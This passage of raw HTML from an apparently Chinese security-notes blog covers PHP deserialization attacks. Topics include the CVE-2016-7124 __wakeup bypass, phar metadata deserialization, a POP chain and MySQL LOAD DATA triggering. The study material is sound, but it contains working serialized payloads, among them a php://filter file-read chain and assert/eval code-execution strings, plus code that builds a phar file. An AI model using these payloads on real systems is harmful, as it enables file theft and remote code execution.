class=\"hljs-built_in\">__isset</span>()，当对不可访问属性调用<span class=\"hljs-built_in\">isset</span>()或<span class=\"hljs-built_in\">empty</span>()时调用<br><br><span class=\"hljs-built_in\">__unset</span>()，当对不可访问属性调用<span class=\"hljs-built_in\">unset</span>()时被调用。<br><br><span class=\"hljs-built_in\">__sleep</span>()，执行<span class=\"hljs-built_in\">serialize</span>()时，先会调用这个函数<br><br><span class=\"hljs-built_in\">__wakeup</span>()，执行<span class=\"hljs-built_in\">unserialize</span>()时，先会调用这个函数<br><br><span class=\"hljs-built_in\">__toString</span>()，类被当成字符串时的回应方法，例如执行字符串匹配的时候回触发<br><br><span class=\"hljs-built_in\">__invoke</span>()，调用函数的方式调用一个对象时的回应方法<br><br><span class=\"hljs-built_in\">__set_state</span>()，调用<span class=\"hljs-built_in\">var_export</span>()导出类时，此静态方法会被调用。<br><br><span class=\"hljs-built_in\">__clone</span>()，当对象复制完成时调用<br><br><span class=\"hljs-built_in\">__autoload</span>()，尝试加载未定义的类<br><br><span class=\"hljs-built_in\">__debugInfo</span>()，打印所需调试信息<br></code></pre></td></tr></tbody></table></figure>\n\n<p><a href=\"https://blog.csdn.net/qq_45521281/article/details/105891381\">https://blog.csdn.net/qq_45521281/article/details/105891381</a></p>\n<h2 id=\"正则绕过\"><a href=\"#正则绕过\" class=\"headerlink\" title=\"正则绕过\"></a>正则绕过</h2><hr>\n<figure class=\"highlight mathematica\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs mathematica\">可以使用<span class=\"hljs-built_in\">O</span><span class=\"hljs-operator\">:+</span><span class=\"hljs-number\">4</span>来替换<span class=\"hljs-built_in\">O</span><span class=\"hljs-operator\">:</span><span class=\"hljs-number\">4</span><br></code></pre></td></tr></tbody></table></figure>\n\n\n\n\n\n<h2 id=\"CVE-2016-7124-Wakeup函数绕过\"><a href=\"#CVE-2016-7124-Wakeup函数绕过\" class=\"headerlink\" title=\"CVE-2016-7124 Wakeup函数绕过\"></a>CVE-2016-7124 Wakeup函数绕过</h2><hr>\n<figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-comment\">// __wakeup()函数，在反序列化时，被自动调用,但当反序列化字符串，表示属性个数的值大于真实属性个数时，会跳过 __wakeup 函数的执行</span><br><span class=\"hljs-comment\">//PHP5 &lt; 5.6.25， PHP7 &lt; 7.0.10 </span><br><span class=\"hljs-comment\">//也就是上面的例子中的3改为4，则就会绕过wakeup函数</span><br>O:<span class=\"hljs-number\">9</span>:<span class=\"hljs-string\">\"DemoClass\"</span>:<span class=\"hljs-number\">4</span>:{s:<span class=\"hljs-number\">4</span>:<span class=\"hljs-string\">\"name\"</span>;s:<span class=\"hljs-number\">4</span>:<span class=\"hljs-string\">\"john\"</span>;s:<span class=\"hljs-number\">3</span>:<span class=\"hljs-string\">\"sex\"</span>;s:<span class=\"hljs-number\">5</span>:<span class=\"hljs-string\">\"Women\"</span>;s:<span class=\"hljs-number\">3</span>:<span class=\"hljs-string\">\"age\"</span>;s:<span class=\"hljs-number\">2</span>:<span class=\"hljs-string\">\"18\"</span>;}<br><span class=\"hljs-comment\">//其中3</span><br>O:<span class=\"hljs-number\">4</span>:<span class=\"hljs-string\">\"Objt\"</span>:<span class=\"hljs-number\">3</span>:{s:<span class=\"hljs-number\">14</span>:<span class=\"hljs-string\">\"%00Name%00username\"</span>;s:<span class=\"hljs-number\">5</span>:<span class=\"hljs-string\">\"admin\"</span>;s:<span class=\"hljs-number\">14</span>:<span class=\"hljs-string\">\"%00Name%00password\"</span>;i:<span class=\"hljs-number\">100</span>;}<br></code></pre></td></tr></tbody></table></figure>\n\n<p>例子：</p>\n<figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Name</span></span>{<br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-variable\">$username</span> = <span class=\"hljs-string\">'nonono'</span>;<br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-variable\">$password</span> = <span class=\"hljs-string\">'yesyes'</span>;<br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__construct</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$username</span>,<span class=\"hljs-variable\">$password</span></span>)</span>{<br>        <span class=\"hljs-variable language_\">$this</span>-&gt;username = <span class=\"hljs-variable\">$username</span>;<br>        <span class=\"hljs-variable language_\">$this</span>-&gt;password = <span class=\"hljs-variable\">$password</span>;<br>    }<br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__wakeup</span>(<span class=\"hljs-params\"></span>)</span>{<br>        <span class=\"hljs-variable language_\">$this</span>-&gt;username = <span class=\"hljs-string\">'guest'</span>;<br>    }<br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__destruct</span>(<span class=\"hljs-params\"></span>)</span>{<br>        <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-variable language_\">$this</span>-&gt;password != <span class=\"hljs-number\">100</span>) {<br>            <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;\"</span>;<br>            <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"You name is: \"</span>;<br>            <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable language_\">$this</span>-&gt;username;<span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"&lt;/br&gt;\"</span>;<br>            <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"You password is: \"</span>;<br>            <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable language_\">$this</span>-&gt;password;<span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"&lt;/br&gt;\"</span>;<br>            <span class=\"hljs-keyword\">die</span>();<br>        }<br>        <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-variable language_\">$this</span>-&gt;username === <span class=\"hljs-string\">'admin'</span>) {<br>            <span class=\"hljs-keyword\">global</span> <span class=\"hljs-variable\">$flag</span>;<br>            <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;<br>        }<span class=\"hljs-keyword\">else</span>{<br>            <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!\"</span>;<br>            <span class=\"hljs-keyword\">die</span>();      <br>        }<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure>\n\n<p>Payload：</p>\n<figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\">O:<span class=\"hljs-number\">4</span>:<span class=\"hljs-string\">\"Objt\"</span>:<span class=\"hljs-number\">3</span>:{s:<span class=\"hljs-number\">14</span>:<span class=\"hljs-string\">\"%00Name%00username\"</span>;s:<span class=\"hljs-number\">5</span>:<span class=\"hljs-string\">\"admin\"</span>;s:<span class=\"hljs-number\">14</span>:<span class=\"hljs-string\">\"%00Name%00password\"</span>;i:<span class=\"hljs-number\">100</span>;}<br><span class=\"hljs-comment\">// 其中构造%00Name%00表明使用对象的private对象，其等价于Name-&gt;username</span><br></code></pre></td></tr></tbody></table></figure>\n\n\n\n<h3 id=\"PHP序列化长度变化导致字符逃逸\"><a href=\"#PHP序列化长度变化导致字符逃逸\" class=\"headerlink\" title=\"PHP序列化长度变化导致字符逃逸\"></a>PHP序列化长度变化导致字符逃逸</h3><hr>\n<p>PHP反序列化中值的字符读取多少其实是由表示长度的数字控制的</p>\n<p>只要整个字符串的前一部分能够成功反序列化，这个字符串后面剩下的一部分将会被丢弃</p>\n<p>如果将对象进行序列化，而后进行改变再进行反序列化，则这个过程中一定存在漏洞</p>\n<figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-variable\">$s</span>=<span class=\"hljs-title function_ invoke__\">unserialize</span>(<span class=\"hljs-string\">'O:11:\"FileHandler\":3:{s:2:\"op\";s:1:\"2\";s:8:\"filename\";s:8:\"flag.php\";s:7:\"content\";s:8:\"flag.php\";}'</span>);<br><br><span class=\"hljs-title function_ invoke__\">var_dump</span>(<span class=\"hljs-variable\">$s</span>);<br><br><br><span class=\"hljs-comment\"># 输出---------------------</span><br><span class=\"hljs-keyword\">object</span>(<span class=\"hljs-built_in\">__PHP_Incomplete_Class</span>)<span class=\"hljs-comment\">#2 (4) {</span><br>  [<span class=\"hljs-string\">\"__PHP_Incomplete_Class_Name\"</span>]=&gt;<br>  <span class=\"hljs-keyword\">string</span>(<span class=\"hljs-number\">11</span>) <span class=\"hljs-string\">\"FileHandler\"</span><br>  [<span class=\"hljs-string\">\"op\"</span>]=&gt;<br>  <span class=\"hljs-keyword\">string</span>(<span class=\"hljs-number\">1</span>) <span class=\"hljs-string\">\"2\"</span><br>  [<span class=\"hljs-string\">\"filename\"</span>]=&gt;<br>  <span class=\"hljs-keyword\">string</span>(<span class=\"hljs-number\">8</span>) <span class=\"hljs-string\">\"flag.php\"</span><br>  [<span class=\"hljs-string\">\"content\"</span>]=&gt;<br>  <span class=\"hljs-keyword\">string</span>(<span class=\"hljs-number\">8</span>) <span class=\"hljs-string\">\"flag.php\"</span><br>}<br></code></pre></td></tr></tbody></table></figure>\n\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041433031.png\" alt=\"image-20200723172157626\"></p>\n<h2 id=\"toString-NaN\"><a href=\"#toString-NaN\" class=\"headerlink\" title=\"__toString()\"></a>__toString()</h2><hr>\n<p>当对对象进行echo和**file_exists()**的时候</p>\n<h2 id=\"phar反序列化利用\"><a href=\"#phar反序列化利用\" class=\"headerlink\" title=\"phar反序列化利用\"></a>phar反序列化利用</h2><hr>\n<p><strong>条件</strong>：php.ini中的phar.readonly = Off</p>\n<figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-comment\">//示例代码</span><br><span class=\"hljs-meta\">&lt;?php</span><br>\t<span class=\"hljs-comment\">//反序列化payload构造</span><br>    <span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">TestObject</span> </span>{<br>    }<br>    <br>    @<span class=\"hljs-title function_ invoke__\">unlink</span>(<span class=\"hljs-string\">\"phar.phar\"</span>);<br>    <span class=\"hljs-variable\">$phar</span> = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Phar</span>(<span class=\"hljs-string\">\"phar.phar\"</span>); <span class=\"hljs-comment\">//后缀名必须为phar</span><br>    <span class=\"hljs-variable\">$phar</span>-&gt;<span class=\"hljs-title function_ invoke__\">startBuffering</span>();<br>    <span class=\"hljs-comment\">//设置stub，GIF89a可以改成其他的字段，绕过文件头检验，但必须以 __HALT_COMPILER(); ?&gt; 结尾</span><br>    <span class=\"hljs-variable\">$phar</span>-&gt;<span class=\"hljs-title function_ invoke__\">setStub</span>(<span class=\"hljs-string\">\"GIF89a\"</span>.<span class=\"hljs-string\">\"&lt;?php __HALT_COMPILER(); ?&gt;\"</span>); <br><br>\t<span class=\"hljs-comment\">//将反序列化的对象放入该文件中</span><br>    <span class=\"hljs-variable\">$o</span> = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">TestObject</span>();<br>    <span class=\"hljs-variable\">$o</span>-&gt;data=<span class=\"hljs-string\">'just a test'</span>;<br>    <span class=\"hljs-variable\">$phar</span>-&gt;<span class=\"hljs-title function_ invoke__\">setMetadata</span>(<span class=\"hljs-variable\">$o</span>);<br><br>\t<span class=\"hljs-comment\">//phar本质上是个压缩包，所以要添加压缩的文件和文件内容</span><br>    <span class=\"hljs-variable\">$phar</span>-&gt;<span class=\"hljs-title function_ invoke__\">addFromString</span>(<span class=\"hljs-string\">\"test.txt\"</span>, <span class=\"hljs-string\">\"test\"</span>); <br>    <span class=\"hljs-variable\">$phar</span>-&gt;<span class=\"hljs-title function_ invoke__\">stopBuffering</span>();<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>\n\n<ol>\n<li><p><code>phar</code>文件头的识别格式是<code>xxx</code> +<!--?php  __HALT_COMPILER(); ?-->，只有这样的格式才能被识别为<code>phar</code>文件</p>\n</li>\n<li><p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041433039.png\" alt=\"image-20200803171031539\"></p>\n</li>\n<li><p><code>phar</code>是压缩文件，那么压缩文件的信息就会存在第二段<strong>manifest describing</strong>，这一段是放序列化的<code>poc</code></p>\n</li>\n<li><p><strong>phar文件会以序列化的形式存储用户自定义的meta-data，在一些文件操作函数执行的参数可控时，我们在参数部分利用Phar伪协议，可以不依赖unserialize() 直接进行反序列化操作，在读取phar文件里的数据时反序列化meta-data，达到我们的操控目的</strong></p>\n</li>\n<li><p>压缩的文件的内容被存在第三段，也就是上面payload的中的<code>text.txt</code>.部分函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化</p>\n</li>\n<li><p>数字签名为该<code>phar</code>的第四段</p>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041433050.png\" alt=\"image-20200803171100075\"></p>\n<p>生成的phar文件</p>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041433318.png\" alt=\"image-20200803161934014\"></p>\n</li>\n</ol>\n<p><strong>使用条件</strong>：</p>\n<p>(1)文件上传点<br>(2)系统文件函数<br>(3) phar:// 伪协议</p>\n<figure class=\"highlight kotlin\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs kotlin\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">TestObject</span>{<br>\t\tfunction __destruct(){<br>\t\t\techo $<span class=\"hljs-keyword\">this</span>-&gt;<span class=\"hljs-keyword\">data</span>;<br>\t\t}<br>\t}<br><br>\tunlink(<span class=\"hljs-string\">\"phar://phar.phar/test.txt\"</span>);<br></code></pre></td></tr></tbody></table></figure>\n\n<p>当执行如上函数时，phar文件中的payload即可被执行</p>\n<h2 id=\"构造POP链\"><a href=\"#构造POP链\" class=\"headerlink\" title=\"构造POP链\"></a>构造POP链</h2><hr>\n<p>例题：</p>\n<figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\">Welcome to index.php<br><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Modifier</span> </span>{<br>    <span class=\"hljs-keyword\">protected</span>  <span class=\"hljs-variable\">$var</span>;<br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">append</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$value</span></span>)</span>{<br>        <span class=\"hljs-keyword\">include</span>(<span class=\"hljs-variable\">$value</span>);<br>    }<br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__invoke</span>(<span class=\"hljs-params\"></span>)</span>{<br>        <span class=\"hljs-variable language_\">$this</span>-&gt;<span class=\"hljs-title function_ invoke__\">append</span>(<span class=\"hljs-variable\">$this</span>-&gt;<span class=\"hljs-keyword\">var</span>);<br>    }<br>}<br><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Show</span></span>{<br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$source</span>;<br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$str</span>;<br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__construct</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$file</span>=<span class=\"hljs-string\">'index.php'</span></span>)</span>{<br>        <span class=\"hljs-variable language_\">$this</span>-&gt;source = <span class=\"hljs-variable\">$file</span>;<br>        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">'Welcome to '</span>.<span class=\"hljs-variable language_\">$this</span>-&gt;source.<span class=\"hljs-string\">\"&lt;br&gt;\"</span>;<br>    }<br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__toString</span>(<span class=\"hljs-params\"></span>)</span>{<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable language_\">$this</span>-&gt;str-&gt;source;<br>    }<br><br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__wakeup</span>(<span class=\"hljs-params\"></span>)</span>{<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-title function_ invoke__\">preg_match</span>(<span class=\"hljs-string\">\"/gopher|http|file|ftp|https|dict|\\.\\./i\"</span>, <span class=\"hljs-variable\">$this</span>-&gt;source)) {<br>            <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"hacker\"</span>;<br>            <span class=\"hljs-variable language_\">$this</span>-&gt;source = <span class=\"hljs-string\">\"index.php\"</span>;<br>        }<br>    }<br>}<br><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Test</span></span>{<br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$p</span>;<br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__construct</span>(<span class=\"hljs-params\"></span>)</span>{<br>        <span class=\"hljs-variable language_\">$this</span>-&gt;p = <span class=\"hljs-keyword\">array</span>();<br>    }<br><br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__get</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$key</span></span>)</span>{<br>        <span class=\"hljs-variable\">$function</span> = <span class=\"hljs-variable language_\">$this</span>-&gt;p;<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable\">$function</span>();<br>    }<br>}<br><br><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'pop'</span>])){<br>    @<span class=\"hljs-title function_ invoke__\">unserialize</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'pop'</span>]);<br>}<br><span class=\"hljs-keyword\">else</span>{<br>    <span class=\"hljs-variable\">$a</span>=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Show</span>;<br>    <span class=\"hljs-title function_ invoke__\">highlight_file</span>(<span class=\"hljs-keyword\">__FILE__</span>);<br>}<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>\n\n\n\n<p>Payload</p>\n<figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\">O:<span class=\"hljs-number\">4</span>:<span class=\"hljs-string\">\"Show\"</span>:<span class=\"hljs-number\">2</span>:{s:<span class=\"hljs-number\">6</span>:<span class=\"hljs-string\">\"source\"</span>;O:<span class=\"hljs-number\">4</span>:<span class=\"hljs-string\">\"Show\"</span>:<span class=\"hljs-number\">2</span>:{s:<span class=\"hljs-number\">6</span>:<span class=\"hljs-string\">\"source\"</span>;s:<span class=\"hljs-number\">3</span>:<span class=\"hljs-string\">\"aaa\"</span>;s:<span class=\"hljs-number\">3</span>:<span class=\"hljs-string\">\"str\"</span>;O:<span class=\"hljs-number\">4</span>:<span class=\"hljs-string\">\"Test\"</span>:<span class=\"hljs-number\">1</span>:{s:<span class=\"hljs-number\">1</span>:<span class=\"hljs-string\">\"p\"</span>;O:<span class=\"hljs-number\">8</span>:<span class=\"hljs-string\">\"Modifier\"</span>:<span class=\"hljs-number\">1</span>:{s:<span class=\"hljs-number\">6</span>:<span class=\"hljs-string\">\"%00*%00var\"</span>;s:<span class=\"hljs-number\">52</span>:<span class=\"hljs-string\">\"php://filter/convert.base64-encode/resource=flag.php\"</span>;}}}s:<span class=\"hljs-number\">3</span>:<span class=\"hljs-string\">\"str\"</span>;N;}<br></code></pre></td></tr></tbody></table></figure>\n\n\n\n\n\n<h2 id=\"MySQL触发反序列化\"><a href=\"#MySQL触发反序列化\" class=\"headerlink\" title=\"MySQL触发反序列化\"></a>MySQL触发反序列化</h2><hr>\n<p>php调用mysql的语句  <strong>LOAD DATA LOCAL INFILE</strong> 导入phar文件也能触发phar中的反序列化</p>\n<p>需要my.ini进行如下配置</p>\n<figure class=\"highlight ini\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs ini\"><span class=\"hljs-attr\">local-infile</span>=<span class=\"hljs-number\">1</span><br><span class=\"hljs-attr\">secure_file_priv</span>=<span class=\"hljs-string\">\"\"</span><br></code></pre></td></tr></tbody></table></figure>\n\n<figure class=\"highlight pgsql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\"><span class=\"hljs-keyword\">LOAD</span> DATA <span class=\"hljs-keyword\">LOCAL</span> INFILE <span class=\"hljs-string\">'phar://phar.phar/test.txt'</span> <span class=\"hljs-keyword\">into</span> <span class=\"hljs-keyword\">table</span> <span class=\"hljs-keyword\">user</span>;<br></code></pre></td></tr></tbody></table></figure>\n\n<p><a href=\"https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/\">https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p>\n<figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\">?data=O:<span class=\"hljs-number\">8</span>:<span class=\"hljs-string\">\"HelloPhp\"</span>:<span class=\"hljs-number\">2</span>:{s:<span class=\"hljs-number\">1</span>:<span class=\"hljs-string\">\"a\"</span>;s:<span class=\"hljs-number\">9</span>:<span class=\"hljs-string\">\"phpinfo()\"</span>;s:<span class=\"hljs-number\">1</span>:<span class=\"hljs-string\">\"b\"</span>;s:<span class=\"hljs-number\">6</span>:<span class=\"hljs-string\">\"assert\"</span>;}<br>?data=O:<span class=\"hljs-number\">8</span>:<span class=\"hljs-string\">\"HelloPhp\"</span>:<span class=\"hljs-number\">2</span>:{s:<span class=\"hljs-number\">1</span>:<span class=\"hljs-string\">\"a\"</span>;s:<span class=\"hljs-number\">3</span>:<span class=\"hljs-string\">\"phpinfo()\"</span>;s:<span class=\"hljs-number\">1</span>:<span class=\"hljs-string\">\"b\"</span>;s:<span class=\"hljs-number\">6</span>:<span class=\"hljs-string\">\"assert\"</span>;}<br>?data=O:<span class=\"hljs-number\">8</span>:<span class=\"hljs-string\">\"HelloPhp\"</span>:<span class=\"hljs-number\">2</span>:{s:<span class=\"hljs-number\">1</span>:<span class=\"hljs-string\">\"a\"</span>;s:<span class=\"hljs-number\">9</span>:<span class=\"hljs-string\">\"phpinfo()\"</span>;s:<span class=\"hljs-number\">1</span>:<span class=\"hljs-string\">\"b\"</span>;s:<span class=\"hljs-number\">4</span>:<span class=\"hljs-string\">\"eval\"</span>;}<br></code></pre></td></tr></tbody></table></figure>\n\n<p><a href=\"https://xz.aliyun.com/t/7570\">https://xz.aliyun.com/t/7570</a></p>\n<ol>\n<li>原理：某些对象在序列化后会因为用户的输入而产生影响，即黑客的数据会被插入到黑客的字节数据中导致该字节序列在服务器端进行反序列化后的对象发生变化。<ol>\n<li>魔术方法：<ol>\n<li>构造函数__construct()：当创建对象时会自动进行调用</li>\n<li>析构函数__deconstruct()：当对象被销毁时会自动调用</li>\n<li>__wakeup()：当调用unserialize()函数时会自动调用</li>\n</ol>\n</li>\n</ol>\n</li>\n<li>触发函数：serialize和unserialize函数进行触发</li>\n<li>防御方式：不要将用户的输入或者用户可控的参数直接插入到反序列化操作中去，采用白名单限制</li>\n</ol>\n<h2 id=\"JAVA中的反序列化\"><a href=\"#JAVA中的反序列化\" class=\"headerlink\" title=\"JAVA中的反序列化\"></a>JAVA中的反序列化</h2><hr>\n<p>下面不属于OWASP top 10中的内容，但为方便查询也在此记录。</p>\n<h1 id=\"PHP伪协议\"><a href=\"#PHP伪协议\" class=\"headerlink\" title=\"PHP伪协议\"></a>PHP伪协议</h1><h2 id=\"一、漏洞依附\"><a href=\"#一、漏洞依附\" class=\"headerlink\" title=\"一、漏洞依附\"></a>一、漏洞依附</h2><p>\\1. allow_url_fopen()打开文件-&gt;通常设置为On，使得可以访问 URL 对象文件等。</p>\n<p>\\2. allow_url_include()引用文件-&gt;通常设置为off，包含URL 对象文件等</p>\n<p>均可在配置文件，php.ini中查看（通常位置：/usr/local/php/lib）</p>\n<h2 id=\"二、常见协议\"><a href=\"#二、常见协议\" class=\"headerlink\" 